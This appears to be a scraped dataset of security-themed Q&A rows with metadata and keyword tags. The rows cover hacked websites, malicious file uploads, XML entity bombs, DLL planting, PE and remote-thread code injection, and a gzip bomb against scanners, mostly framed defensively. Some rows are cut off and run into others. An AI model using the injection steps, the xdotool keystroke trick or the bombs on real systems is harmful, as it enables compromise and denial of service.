
12993,if you wrote the vulnerable web application yourself then you ve already got a head start figuring out where to find  most  of the access points are which could be exploited unfortunately that may not be good enough writing and maintaining secure web applications is harder than most people think  if you  didn t  write the application yourself or if you re re-using large complex components that someone else wrote or if you simply need help getting a handle on website security then there are commercial services that can crawl your site and try to figure out where they are vulnerable e.g   these services cost money obviously but you can usually get a free trial to see if they would be helpful good luck!  i would suggest changing any ftp or ssh passwords to be very secure if you use a hosting provider you should also notify them of the breach if you do not have logs to investigate the matter then they may you should also google the code that was added to your page to see if you can find anything else  who are you hosted with? some hosters have security leaks that can get exploited  are you using wordpress? there s also been an number of reported outbreaks the best thing to do would be google it looking for people with similar problems which will also lead to the cause which will lead to the solutions  if you has static ip - you can forbid ftp-access from not yours ip  as others have suggested the vulnerability is most likely in some script you are using maybe something you ve written yourself or then a well known application that has known vulnerabilities this might be a vulnerability in an upload script but i want to point out that it is also possible to upload files through sql injection see the following  thread for more details   we have experienced a problem similar to this a while ago with one of our major web properties what your web host said was correct it was likely due to not ftp access but an insecure script that somehow allowed modification of arbitrary files in our case a vulnerability in an old phpmyadmin allowed changes to some php scripts  if you haven t done so already you may want to make sure that the web server has only  read privileges  to all scripts and html files it turns out that apache could also write to scripts in our case simply   this happened to me a while back in different manners  a work account was compromised through phpbb via a code exploit  somehow they even added themselves into the mysql db users table  that caused us to completely remove the program and discontinue use  an old joomla install was the vulnerability that allowed people to do exactly what you speak of to my personal site  i had forgotten it was even out there but it was enough to open the door for them to install malicious code on several different sites  i took the site down changed permissions updated joomla and scrubbed files  my current production server gets sniffed for phpmyadmin more than 1000 times per hour during some peak hack attempts  the bad guys are working overtime!  bottom line be wary of open source code and if you do use it update update update  phsource is the closest  if you re on a shared server other people have access to the server itself this is sort of the definition of a shared server the problem is that if you have files with permissions of 777 they are world-user-group writable which means anyone with access to the box can write to them see the problem?  all it takes is  one  person on that box to have a weak password poorly configured script or a horrible bit of code and a mediocre script kiddie can cause all kinds of problems all over the box most of these attacks are purely automated they get access scan for attack-able files and append as needed  most likely you should change all of your files to 755 or 644 permissions you ll sleep better at night  and after you re done cleaning it up make sure google hasn t flagged you as a malicious site it s not horrible to clean up but it can decimate your traffic in the meantime  looks like your server has been compromised also are you on shared host?  you can find out security configuration of your server with    phpsecinfo         source  phpsec.org      i don t think that the problem is that you are using a shared host because i have found six others  degmsb   benvolio   joomla01   dj-alien   valerione1979  and  kars  whose websites had the same script added also it is doubtful that any of your files would be writable by others because files that are uploaded over ftp are subject to the file creation mode bits mask  my best guess is that someone is cracking websites using either known exploits or exploits against common weaknesses and that this person is identifying likely targets with  google hacking  degmsb s wordpress website and benvolio s burning board lite website were likely cracked via known exploits possibly known exploits of plugins to these software bases such as tinymce and your website since you wrote it yourself was likely cracked via an exploit against a common website weakness  given that you allow file uploads one of your php scripts accepts &amp saves files that are uploaded by your users i would consider  cwe-434 unrestricted upload of file with dangerous type  a cwe-434 exploit works like this suppose you allow users to upload avatar images or pictures the script to which uploaded images are posted might save the file to   using the same filename that the user supplied now imagine that someone uploads   or     etc. your script will dutifully save this upload to   and all that the cracker needs to do to have the server run this script is browse to   even if the file is named   some web servers will execute the file  another possibility is that the filename of the upload that php receives   which is the   value in the   header that is sent was constructed to something like   if your script saved the newly-uploaded file to   or   on a non-windows host  http://codepad.org/t83dyzwa  and there was some way for the user to cause one of your php scripts to   or   any script in the   directory say   then the cracker would be able to execute arbitrary php   edit  it  looks like    is some sort of unrestricted directory browser and file uploader if a user manages to get this uploaded to your server then they can basically do anything that you can do with your ftp access  delete it    edit2  look for copies of  this php source  the part    remove it from all of your php scripts    edit3  googling parts of the php script i have found several webpages where this source is listed verbatim and all of these pages have something to do with file uploading functionality for the respective websites it therefore seems very likely that the hacker of your website used a cwe-434 exploit,2010-06-25 20:52:28.423 UTC,1653,3121367,the problem   on my webspace there are php files which all end with this   before this line there is also html code in the files  the output in the browser ends with this of course   but yesterday there was some malicious code at the end suddenly the output of my index.php was   i opened the file on my webspace downloaded via ftp and i saw that someone had put this code right into the file!   how could this happen?

840,in scenario 1 you can safely assume that the content will not be executed on the server and the user will be forced to download the file rather than viewing it in their browser this is  reasonably  safe from your point of view because you offload the responsibility of checking the file to your users  in scenario 2 i d definitely run it through an av your parser library might have a vulnerability so you most definitely want to do some basic checks before handing it off to the library  if someone asked you to carry a sealed package as part of your luggage on a commercial flight would you?  even if you re just providing a respository for users to store their own files rather than re-publishing the uploaded content it would be reckless to accept anything that is thrown at your server  however av scanning is not the only way to protect against malware - verifying the mimetype and using a lossless conversion method to switch between formats can neutralise a large proportion of threats e.g convert jpg to png msword doc to pdf* if you have implemented your own parser for the file and it s a basic format such as xml then you re already verifying the contents - av scanning is probably overkill but like all code it should be secure  * but not using msword to do the conversion!    i see no reason to use a virus scanner in the second case the chances of a code-execution vulnerability in an anti-virus seem larger than that of a vulnerability in my parsing libraries especially if the parsing libraries are written in a memory safe language  in the first case i d use an anti-virus since offering virus files for download doesn t sound like a good idea both people and automated website reputations systemsfor example google safe browsing might associate virus downloads with your website hurting its reputation i might still offer such a file for download but only after an explicit warning and user confirmation preferably a confirmation that prevents bots from downloading it     type of file isn t checked when uploading they are stored in folder that isn t directly accessible from the internet files don t have permissions to execute then user may query some url and files will be returned with content-disposition attachment   scanning before delivering the attachment is just the courteous thing to do but there are lots of things that are problematic to store but which will pass a virus scan just fine  this may be a tad paranoid but if you wouldn t intentionally write software that lets people plant evidence that incriminates you don t unintentionally write software that does that  what kind of information do you log about the uploaders?  might you have enemies who would upload child pornography or bomb-making plans to your server and then send an anonymous tip to the police?     type of file isn t checked when uploading its content is parsed with some html/xml/json/etc parser after parsing the file isn t stored at server   anti-virus scanners are unlikely to be helpful here  same question as above  can you sanity check the information you extract from the files or prove that whatever information you store came from an external source,2012-11-01 09:35:34,654,23459,web application allows users to upload files is it necessary to scan those files by antivirus?  i d want to hear answer in two scenarios   type of file isn t checked when uploading they are stored in folder that isn t directly accessible from the internet files don t have permissions to execute then user may query some url and files will be returned with content-disposition attachment  type of file isn t checked when uploading it s contents is parsed with some html/xml/json/etc parser after parsing file isn t stored at server,0.027522935779816515,18,sse,antivirus|appsec|file-upload|web-application,is it necessary to scan users  file uploads by antivirus,7,bomb|virus|malware|protection|sanitization|vulnerability|neutralization,0.2549545168876648

3735,an attacker can use an xml file for nefarious reasons  and as you asked if anything like that occurred in the past there have been examples of such malicious xml attached files in the past  in fact the  attack i am going to mention is recent and done by the end of februaru 2015 where companies are sent a spam with an attached malicious xml file       this attachment is a microsoft word xml document microsoft has a special handler for xml files that will choose the application to handle them based upon detection of the contents as described  here  so double clicking on it can lead ms word to be executed and thus loading the malicious macros embedded within it  here is diagram showing how the malicious document was stored       source    possible xml based attacks are    xml bomb  aka billion lols attack   this is an xml file that uses a recursive custom entity type definition to attack a vulnerable xml parser the xml bomb has a very small size on disk but expands up to a huge size when parsed potentially exhausting the available memory on the victims device    external entity type that may not return   in this case the xml document defines an external entity type at a url that either does not respond or responds slowly this could cause a dos on the victims device   external entity type that expose sensitive information  this is similar to point 2 and is explained at the same link but in this case the external entity type attempts to expose sensitive local files e.g     whether any of these attacks could succeed depend on the installed xml parser on the local machine i think applications like newer versions of ie firefox etc protect against these but older versions or some custom software might be vulnerable  if they block html then it also makes sense to block xml because it can be transformed using xslt into xhtml the transformation is supported by all recent browsers passing the acid3 test which is pretty much especially security-wise like normal html,2015-10-26 12:31:33,469,103712,a colleague sent a .xml file to me earlier today which was blocked by outlook as we were discussing the workaround put it in a .zip we got to wondering  why  .xml files are blocked  my colleague reckons it s because the browser is the default renderer for .xml files and there s possibly an attack vector by passing a html file with an xml extension but i tried this on firefox and i am shown the document tree as a bare xml file  does anyone have any examples where an xml file could be added as an attachment to do something malicious or at least moreso than any other random attachment that isn t blocked,0.029850746268656716,14,sse,email|xml,why do email programs block xml files,6,bomb|attacks|protection|vulnerability|denial of service|sensitive information,0.24882417917251587

44663,actually i just came up with an idea since netbeans does analysis and shows dependencies on java code maybe it s better to handle all paths &amp domains as java variables  i ve created a package on my project named fileresolver and inside i have one class for each file type on my project eg one class for jsp files one for css files etc inside those files i ll record &amp hardcode all paths of all files in public static final string variables sample   all over my project i should use the variables instead of paths then anytime i refactor a file i ll have only one file to change is the mapping value in those variables ...and if somethime i need to change the variable netbeans will refactor all of them in the project at once ...i think this will work just fine since i keep my project clean from file paths and the only thing i have to worry about is the mapping in that file of the variables to appropriate file paths   edit  i ll write a simple parser to create those java files instead of writting by hand for all files .. i ll update when i finish it     update   here is my fileresolvergenerator   just to be specific .. this scans all files under /web-inf/jsp/ and creates a java file having all jsp files  registered  to public static final string variables with each path .. the idea is to use the generated java file as reference for all jsps are in project .. always use these variables instead of hardcoded paths .  this has nothing to do with the project or any project it s just a tool which saves youtime instead of doing this by hand for every file in the project   i also created another class resolverconsistencychecker which takes all variables and checks if the filepath is correct file exists .. since we didn t made any changes to filenames and filepaths all tests are passed  this method should run when testing project for  errors     in the jsp files themselves you can avoid nearly all hardcoded domain / urls by using    for example when creating a link to another page you would do it like this   this means that regardless of where your webapp is the link will always have the right url  for example in my development box this link would be   but on my production server it resolves correctly to   you can see that in my dev server the webapp context is under /accounts but on the production machine it s just under / as the webapp is under the root context  you can read a small tutorial  here    properties file is always a good option so that you have to make changes if any only at one point  if you are referencing any static contents js images css etc you don t have to hardcode the entire file path instead you can do this:-   the rest of the file paths hibernate domain mappings forwarded page in spring controller etc should be relative to your project structure and most ides are smart enough to refactor them without problem.. or at least in my case intellij seems to handle of all that for me  at some point of time you need to ask yourself how much of hardcoding is acceptable vs not acceptable? further i wouldn t try to stray too far away from the spring/hibernate recommended solutions if you make everything too abstract you have a different set of problem to deal with and it becomes counterproductive to other peers that may be inheriting your project in the future,2013-01-14 12:27:58.423 UTC,755,14318399,i m currently developing a web site using servlets &amp spring framework as usual it contains lots of files jsp js css images various resources etc.i m trying to avoid writing any hardcoded path or domain in any file ..  for example as you may know when a request is handled you  forward  it to a jsp page it s path probably will be hardcoded other examples are imports images/css/js etc in jsp files ..  is there any general way or tools to avoid hardcoded paths/urls so any refactorings won t cause troubles?   edit  i use netbeans 7.1.2 .. unfortunately netbeans only helps with pure java code when working with jsp files things are limited and if you add custom tag files and jsp 2.0 el is like programming in console mode :p,0.013245033112582781,10,so,file|hardcoded|java|jsp|path,eliminate hardcoded file paths and urls in web development,1,hardcoded,0.24739021062850952
66094,i am not familliar with linux internals to a great extent so take this answer with a grain of salt  when you log into x server as a normal user all of the processes spawned are of the privileges granted to that user the processes have restricted access to the system the extent of which is enforced by operating system configuration but are free to interact with other user processes because of this the process memory adress space is accessable and most likely writable by all other processes owned by this user when you elevate your privileges by running the su program the new subprocess thread whatever it may be is launched by the parent process running as the normal user   with this in mind it is possible to imagine a scenario where an injection of code is done into this parent process in order to get access to the internal memory space of that victim process if so it is theoreticly possible to intercept the session and privilege token to obtain root access  i can see this done in two different ways:- set a hook for a launch of su program and divert the flow to elevate several processes instead of just the desired one.- intercept an active session and inject a request to spawn or elevate a different process  both of these scenarios would require arbitrary code execution on a victim machine so it would be a later stage of the compromise it might make a difference if you run x or not in a sence that a correct process to inject into might be harder to know about rather than the default bash  in any case i would think that it is feasable to perform such an attack but the code to do so would have to be quite targeted and unless you are a victim of an apt campaign the chances of someone rooting your box by stealing your  su -  comand are close to none   i have no practical knowledge of how to pull of such a stunt on linux so if i am wrong about the above points feel free to correct me   yes  it is less safe than if you switched to text console and log in as root directly   proof 1   if you are logged in as root in a terminal another process can send commands to that terminal  simple proof of concept    open a terminal place in in the top left corner of the screen and switch to root   open a second terminal that does not overlap the first and type      $ xdotool mousemove 100 100 click 1 &amp;&amp xdotool key l &amp;&amp xdotool key s &amp;&amp;

  to answer just this part of the question no of course not because most applications don t operate under the extremely insecure set of preconditions necessary for this question to even apply   don t ever load code from a location that a less-privileged process could write to  don t ever let a less-privileged process write to your install directory   if your attacker can write to your install directory for example to drop a dll redirection file then they could probably just replace your executable or at least edit it even if they have write access to the dir but not to your executable or existing local dlls  and  dll redirection is already enabled it takes admin to toggle it you ve already screwed up  if your attacker is less privileged than you give them a location where they can write files and your process will read them presumably that is  not  your install directory if your attacker has the same privileges as you they don t need to plant dlls for you they can do anything you can do or just hijack your process using debug apis once it starts  edit this isn t windows-specific either this is how literally all general-purpose operating systems - even locked-down ones like ios - work the solution is the same too don t run potentially-untrustworthy code with permission to modify executable code loaded by more-privileged or even differently-privileged programs  .net has an  defaultdllimportsearchpathsattribute  you can use on a per p/invoke or per assembly basis to constrain   to only get the dll from  safe  locations,2016-10-24 15:14:38,919,140703,i have a situation where malicious files are being copied to the installation directory of some software and the software will load those files when making a call to  loadlibrary  or  dllimport  in .net land  if your software runs with administrator privileges a p/invoke on a malicious dll can essentially run any code in an elevated fashion using your application as a vehicle to do so on it s behalf  many of these techniques can be found in this question  ways to inject malicious dlls to exe file and run it   what i m asking is how as a software developer can you prevent this type of attack?

16180,you should actually test your application with sample documents and see if it is vulnerable  the underlying library for php s xml libraries is libxml2 it s behavior is controlled from php mostly through  optional constants  which most libraries will accept as an argument when loading the xml  you can determine your php s libxml2 version with    in later versions after 2.6 libxml2 contains entity substitution limits designed to prevent both exponential and quadratic attacks these can be overridden with the   option  by default libxml2 does not load a dtd add default attributes or perform entity substitution  so the default behavior is to ignore dtds  you can turn parts of this on like so     will load dtds    will disable network-loading of dtds you should always have this on and use libxml s dtd catalog to load dtds    will perform dtd validation while parsing    will perform entity substitution    will add default attributes   so using the default settings php/libxml2 are  probably  not vulnerable to any of these issues but the only way to know for sure is to test      note  if you create test-cases with files that contain the xml chunks in the following expect that editors might be prone to these attacks as well and might freeze/crash   billion laugh     when loading     fatal #89 detected an entity reference loop 1:7   .. plus six times the same = seven times total with above   fatal #89 detected an entity reference loop 14:13   result     memory usage is light the peak not touched by   as this example shows 7 fatal errors one can conclude and indeed it is so that this loads w/o errors     as entity substitution is not in effect and this work let s try with  quadratic blowup  that is this one here shortened for your viewing pleasure my variants are about 27/11kb     if you use   this does work as an attack while i write this the script is still loading ..  so this actually takes some time to load and consumes memory something you can play with your own w/o   it works flawlessly and fast  but there is a caveat if you obtain the   of a tag for example you will get the entities expanded even if you don t use that loading flag   a workaround for this issue is to remove the documenttype node from the document  note the following code     so while this workaround will prevent an xml document from consuming resources in a dos it makes it easy to generate invalid xml  some figures i reduced the file-size otherwise it takes too long  code      i have not made up my mind so far about protection strategies but now know that loading the billion laugh into  phpstorm will freeze it for example  and i stopped testing the later as i didn t wanted to freeze it while writing this,2012-04-18 15:30:02.147 UTC,752,10212752,i m writing a web application that has an xml api in php and i m worried about three specific vulnerabilities all related to inline doctype definitions local file inclusion quadratic entity blowup and exponential entity blowup i d love to use php s 5.3 built in libraries but i want to make sure i m not susceptible to these  i found i can eliminate lfi with libxml_disable_entity_loader but this doesn t help with inline entity declarations including entities that refer to other entities  the simplexml library simplexmlelement simplexml_load_string etc is great because it s a dom parser and all my inputs are fairly small it allows me to use xpath and manipulate the dom pretty easily i can t figure how to stop entity declarations i would be happy to disable all inline doctype definitions if possible.  the xml parser library xml_parser_create xml_set_element_handler etc allows me to set the default handler which includes entities with xml_set_default_handler i can hack it so for unrecognized entities it simply returns the original string ie &ent; this library is frustrating though because it is a sax parser i have to write a bunch of handlers as many as 9..  so is it possible to use the built in libraries get dom-like objects out and protect myself from these various dos vulnerabilities? thanks  this page describes the three vulnerabilities and provides a solution...if only i were using .net  http://msdn.microsoft.com/en-us/magazine/ee335713.aspx   update   i tried   as well in both cases i end up dumping 300+ mb is there something i m still missing,0.02127659574468085,16,so,denial-of-service|doctype|php|security|xml-parsing,how can i use php s various xml libraries to get dom-like functionality and avoid dos vulnerabilities like billion laughs or quadratic blowup,5,flaws|attacks|protection|vulnerability|denial of service,0.2440824806690216

20128,in my opinion even though the whitelist maybe a bit of a chore to maintain it s far more secure than using a blacklist  it s much better to forget to add something to the whitelist and have to go back and change it than to forget to add a new file extension to the blacklist and get hacked  in addition to the whitelist i would still virus scan the uploaded files as even seemingly harmless files such as .pdf or .doc can have malicious code .pdf s support javascript and .doc macros  i would allow any file extension to be uploaded but i would store the files in a folder that is not directly served by the web server i would then create a http handler that would be linked to from the email which would stream the requested file the file could be requested either by original file name a system generated file name or by an id either way i would sanitise the parameter to guard against directory traversal attacks  e.g www.example.com/filelink.ashx?filename=word.docx  this way you do not need to worry if in future you wish to serve additional file extensions as executable file types as any file is served directly from a byte stream from the file system and is never passed through the web server handlers  you can also use the handler to check that the current user has the correct permissions to load the file  it would also be worth virus scanning each file just in case the newsletter author uploads either maliciously or accidentally a file that would attack subscribers  computers rather than the server  also ensure that the     is set to     this guards against xss being achieved by upload of html containing script tags or other same origin policy  bypasses using flash or pdf files  the scenario here is one newsletter editor compromising the session of another newsletter editor it is worth also setting   which can also protect against this   files silverlight could also bypass the same origin policy so check that the filename cannot be ended in   to request your file  e.g    and you could blacklist the setting the content type for silverlight as extra protection for this special case  source here      note .xap files can be renamed to any other extension but they cannot  be load cross-domain anymore it seems silverlight finds the file  extension based on the provided url and ignores it if it is not .xap.  this can still be exploited if a website allows users to use  or  / after the actual file name to add a .xap extension      note when silverlight requests a .xap file cross-domain the content  type must be application/x-silverlight-app   i ve also verified these scenarios myself and are are currently valid attack vectors     or is it more proper to just allow anything and run it by a virus scanner   yes  both blacklists and whitelists are trivially circumvented and cause just administration pain and provide no security whatsoever  i would recommend you   use a whitelist approach by the reasons described above it s fairlymore secure  check the filetype bypassable but still one more measure  store uploaded files in internal folders not exposed to the public using non enumerative ids  set-up a low grade permission to the folder that will contain the uploaded files  set-up less privileges as possible to the uploaded files  make sure if there aren t secure libraries to upload files already available   antivirus aren t worth it most of web shells signatures are really easy to bypass since any  hacker  can add some random code and do different types of encodings on an web shell sure it will protect you from common shells such as c99 but nowadays there are thousands of these tools publicly available and fully undetectable and regarding protecting your users from executable files or infected pdf s hosted on your websites if someone it s capable of get a shell on your site and start up a malware campaign it won t use malware or virus already spotted by av signatures,2012-02-20 12:00:06.97 UTC,812,9360770,i m making a newsletter editor which will allow file uploads the sender of the newsletter can upload files to the server which will be linked to in the email    the site is set up so that only .do uris are actually executed/handled by servlets so it s not much of a security risk but i ve been told to blacklist .jsp .php .asp .aspx .exe .com and .bat  this does not strike me as a comprehensive blacklist and i ve the impression that blacklists are not a good policy  on the other hand a whitelist would be dozens long  what s the correct way to identify allowable/disallowable extensions?  or is it more proper to just allow anything and run it by a virus scanner or some combination of these,0.029556650246305417,24,so,policy|security,whitelist or blacklist file extensions for uploads,10,virus|bypass|attacks|exploit|malware|protection|sanitization|malicious code|directory traversal|cross site scripting,0.23710644245147705

65344,a portable executable pe file can describe a number of different types of object including exe files dlls screensavers and drivers all pe files have a set of headers followed by a set of sections  the headers and tables describe the type of executable the functionality it supports the apis it calls etc the sections tell the pe loader how to map file data into memory  there are three main headers and two main tables    dos header  - contains the magic number mz the dos stub and some very low-level information about the executable this is largely legacy now and is only included for historical purposes   common object file format coff header  - contains machine type e.g i386 or intel64 and some basic flags about the type of executable that this file is   portable executable pe header  - contains information about the runtime of the process e.g entry point address code and data sizes base addresses the windows subsystem to run in e.g gui console driver efi etc. the characteristics of the module e.g is it nx / aslr compatible? the initial stack and heap sizes etc   data directory table  - a set of pointers rvas and sizes for sixteen special segments of the file data e.g the import / export directories the debug directory .net metadata security directory relocation table tls directories etc   section table  - a table that represents various sections within the executable sections contain the data that constitutes the actual program e.g the instructions   when the os loads a pe file it creates blocks of virtual memory for each section with the addresses sizes and flags specified in the section table and copies the data from the file into these memory sections there are two special sections code and data the code and data sections are identified by the   and   fields in the pe header and are assigned to the   and   segment registers respectively the   register or   in 64-bit is then set to the value as specified in the   field in the pe header and the program begins  the pe format  was not  designed to be resistant against modification there are many vectors to code injection at the file level   add a new section to the section table mark it as code then change   to point to your new section you can now execute code and return back to the original entry point oep this is easy for avs to detect because the ep points to outside the code section  inject code into the slack space at the end of the original code section then modify the entry point and jump back to oep at the end of your injected code this slack space is usually limited in size so it s not always this simple it may also be possible to use dead code as slack space  expand the original code section shift the data down inject your code at oep re-map the entire section table re-map any fixups and rebuild the imports and exports directories this is difficult and essentially involved re-building the entire file but is difficult for avs to detect  add a new data directory that contains instructions often encrypted then inject a small stub into the program through any of the above methods that allocates a new executable memory block and copies the data into it if encryption is used the stub decrypts the instructions this new code block can then be jumped to directly  add tls callback entries that include an initialisation callback to some code you have injected into the file e.g via a new section  modify known functions to do something different entirely  modify call tables to point to alternative patched code  many more..   as you can see if an adversary has write access to a pe file they can inject their code pretty easily the best protection against this is  digital signatures  which are managed inside the security directory of the pe file a digital signature is essentially a certificate that is signed by a trusted provider or by a provider whose certificate authority you trust this certificate is then embedded in the pe file and matches the data exactly if you modify the pe file or modify the signature the pe loader will reject the file of course it is also possible to simply strip the signature from the file so that it runs without any certificate this can be prevented via local policy in which you can set a flag that requires all executables to be signed  unfortunately this isn t the only way to inject code the alternative is to inject memory into a process at runtime then start a remote thread inside that process this is relatively trivial in windows   call   on the target process with     and   privileges  call   to allocate a block of executable memory in the remote process  use   to write code into that memory  call   to start a new thread in the process using the base of the allocated memory as the thread entry point   this causes code to run in the context of the target process however this is only possible when step 1 succeeds and this is reliant on the malicious process having access to the other process a low-privilege user cannot open such a handle to a high-privilege e.g administrator user s process however if the malicious process is running with high privileges all bets are off  there is very little that can be done to protect you from these attacks once a malicious application is running with write access to processes and executable files,2013-06-24 07:24:21,1024,37921,trying to understand how and why any virus malware worm and code injections are successful after all in a windows portable executable format i was going through the pe structure documentation  part 1  and  part 2    what is it in pe executable is the the headers sections that let code injections happen?

10850,ok so i have now found the answer to my own question  the nvd xml is challenging to translate as elements and attributes are nested at different levels in the original xml  the code i am using to import this now is as follows   the challenge with importing atributes at different levels is that you need to select a reference point with xsl:template match command and you can only reference each part of the original xml once hence if you want to import all atributes in the nvd xml you need to use multiple xslt files and import different levels in stages to ms access.below is an example of importing a child table    by running a second import to access it is now possible to create a separate table with the fact ref and have that linked to the cve-id once in access the two tables can be linked using cve-id.for each set of attributes that are related children/parents that you want to import you need a separate xslt file but if they are both children to the same or different parents then they can be included in the same xslt file the problem only occurs when you try to convert a child nested in a parent,2016-07-25 16:34:56.277 UTC,877,38573141,with reference to existing question

is not a big problem  the following xml is an abridged but still valid set of xml that contains 2  entry  records and no more than 3 child records per child table   [end edit]  i am able to import all tables and i am able to add the link  vuln:cve-id  as a key to all child tables i import except the child table  vuln:vulnerable-configuration   i have two main problems    i can not import attributes only elements    when a child table has more than one record relating to the main table entry only the last record in the xml will be imported to ms access [edit this is now solved see below end edit]    first issue 1 i have tried to use the following code to import attributes    it works as long as i do not use name spaces but as soon as i use xmlns to define a name space in the xslt file ms access throws me an error that prefixes  xml  and  xmlns  are reserved for use by xml however if i use the following xslt and do not attempt to do any conversion of attribute to element ms access is ok using the same xmlns commands     issue 2 when a child table has more than one record relating to the main table  entry  only the last record in the xml will be imported to ms access i am using the code above for importing all elements  [edit]i have now managed to resolve issue 2 by correcting the following piece of code in the xslt file   element1 is my reference point that contains multiple child elements in the source xml  element2 to /element2 is the resulting xml code so in my case the same as element1 but by choosing different element1 &amp element2 one can modify the structure of the resulting xml.the directory structure jumps represented by ../../ is the number of steps to select and copy the  vuln:cve-id  from the  entry  record so depending on how many levels of child elements you have you may need to use either ../ or ../../ or none  the code that works for me now pulling out most of the records and child records at least the ones i am interested in is below note that it does not pull out all child tables exactly as per the original xml but it does give me what i need one of the simplifications i have made is that all child tables are linked to  vuln:cve-id  even though the source xml has child tables within child tables but i prefer the flatter structure     note that for the product element the  is required to identify the current node in the line   this is required because of the structure of the original xml it is different to the rest of the child nodes  so now it is only issue 1 that is still a problem for me  [end edit]  the plan is that once i get both sets of code working separately i would combine them so that i can import both attributes and elements to ms access  very grateful for any

11807,if you set the   key in you app s   to   audio will keep playing while backgrounded      audio  the app plays audible content in the background   more on   keys check  here   i used data protection mechanism and particularly before i am going to write the nsdata into documents directory i need to set the protection none to particular file path so i used  nsprotectionnone  property for the file path  if we won t set the protentionnone property the apple won t allow to access the file on locked state    and i used to play the dummy audio file in infinite loop from app bundle so the dummy audio file is playing continuously using avfoundation framework so i can able to access the documents directory audio files continuously one by one  does it work in the background when your device is unlocked?  if so it sounds like a permissions issue if you have enabled data-protection for your app at developer.apple.com whilst the device is locked with a passcode you will not be able to read the documents directory because the files are encrypted  we got stuck trying to write to a database whilst the device was locked wasted a good two days to figure that one out  w   edit - also may find the setting in xcode under capabilities   are there other audio/video apps currently running on your device? some of them that also use avaudiosessioncategoryplayback can interrupt your audio session   how it is said on apple developer      by default using this category implies that your app’s audio is nonmixable—activating your session will interrupt any other audio sessions which are also nonmixable to allow mixing for this category use the avaudiosessioncategoryoptionmixwithothers option,2014-02-19 08:46:54.893 UTC,359,21875213,actually i fetching the songs from  documents directory   i referred this link:-  http://www.raywenderlich.com/29948/backgrounding-for-ios   but it will play the songs from bundle only but i want to play the songs from documents directory  i tried    background modes in the plist    application does not in background = no in plist    in appdelegate didfinishlaunchingwithoptions:-     playmethod     data protection   all i tried but not working! can anyone help me,0.019498607242339833,7,so,avaudioplayer|avplayer|ios|iphone|objective-c,avaudioplayer is not playing in background when iphone is locked,3,infinite loop|data protection|permission issues,0.19822922348976135
23143,i think the best way for you to know is simply take an azure vm iaas and activate microsoft antimalware extension then you may log into it and do all the necessary check and tests against the service later you will apply all this into the worker role there is a similar paas extension available for that calles paasantimalware   see the next excerpt from  https://msdn.microsoft.com/en-us/library/azure/dn832621.aspx   in paas the vm agent is called guestagent and is always available on web and worker role vms for more information see azure role architecture. the vm agent for role vms can now add extensions to the cloud service vms in the same way that it does for persistent virtual machines the biggest difference between vm extensions on role vms and persistent vms is that with role vms extensions are added to the cloud service first and then to the deployments within that cloud service   use the get-azureserviceavailableextension cmdlet to list all available role vm extensions  there isn t a direct api that we ve found but the anti-malware services conform to the standards used by windows desktop virus checkers in that they implement the   com api  so we ended up implementing a file upload service that writes the uploaded file to a quarantine local resource then calling the   api if the file is infected then depending on the anti-malware service in use it will either throw an exception silently delete the file or mark it as inaccessible so by attempting to read the first byte of the file we can test if the file remains accessible,2015-03-04 19:18:54.603 UTC,407,28862992,i m trying to find a solution that i can use to perform virus scanning on files that have been uploaded to azure blob storage  i wanted to know if it is possible to copy the file to local storage on a worker role instance call antimalware for azure cloud services to perform the scan on that specific file and then depending on whether the file is clean process the file accordingly    if the worker role cannot call the scan programmatically is there a definitive way to check if a file has been scanned and whether it is clean or not once it has been copied to local storage i don t know if the service does a real-time scan when new files are added or only runs on a schedule,0.019656019656019656,8,so,azure|azure-worker-roles,can a worker role process call antimalware for azure cloud services programmatically,3,virus|antimalware|anti malware,0.18272867798805237
24002,i found a ready-to-use solution on github  it s called  gzipbloat  and it does exactly what i was looking for  first you generate a 10gb gzip file 10mb after first compression filled with input from     in php you then set the content encoding and send the gzip file to the client    results win10    ie11 memory rises then ie crashes  chrome 52 memory rises error is shown  edge 38 memory rises then drops and nothing is displayed seems to load forever  nikto scans in regular speed no memory problems  sqlmap high memory then crashes,2016-08-03 13:33:47.507 UTC,252,38745171,i m currently developing a php class as sort-of-ids for webapps that can detect bruteforce and sqli attacks and one thing i came to realize is that most attacks on my systems are being done from unconfigured malware scanners like nikto or sqlmap let s disregard for a moment that this should be done by the server and not the web app  since they are all built to analyze answers from webservers i thought it could be possible to bomb them with a  zip bomb   the idea is that my php script sends a gzip header with small compressed gzip data that the client will unzip - causing it to exhaust its memory  can anyone tell me some pointers on how to achieve that or is gzip only done by the webserver and it can t be done via php,0.03571428571428571,9,so,apache|gzip|nginx|php,php - is it possible to implement a gzip bomb in php for malware scanners,4,bomb|sqlmap|malware|attacks,0.17101024091243744
63632,,2019-10-18 10:59:21,257,58449484,okey dokey so i figured i d jump into asp.net core for a reporting server now the goal of this was to cache and aggregate reports that can then be distributed to clients  so before i setup everything to start making api calls to poll the data i figured i would build the scaffolding using csv s and because that s mostly the format the data is already in  in the nature of the mvc model i built a simple model   now my simple dbcontext   my setup.cs   my service with very janky csv reading   now to fill in some of the gaps the reason i added the janky csv reader is because when i used csvhelper just reading the csv spiked ram usage into the 1gb range and from what i can tell this is due to the loh  so i added a bunch of gc stuff and it didn t make a difference then i added my janky line by line reading of the csv and the huge ram usage vanished but the moment i started inserting the data into the database it came back  the csv i m reading is about 26k lines and 5mb in size the reason it s reporcessing the csv every 5 seconds was to confirm the leak  i don t know what to do somehow deleting and re-adding 5mb worth of data into a sqlite causes ram usage to spike up to 1gb let me know what you think,0.011673151750972763,3,so,asp.net-core|c#|entity-framework-core|memory-leaks|sqlite,asp.net core ef-core sqlite memory leak,1,memory leaks,0.1611521989107132
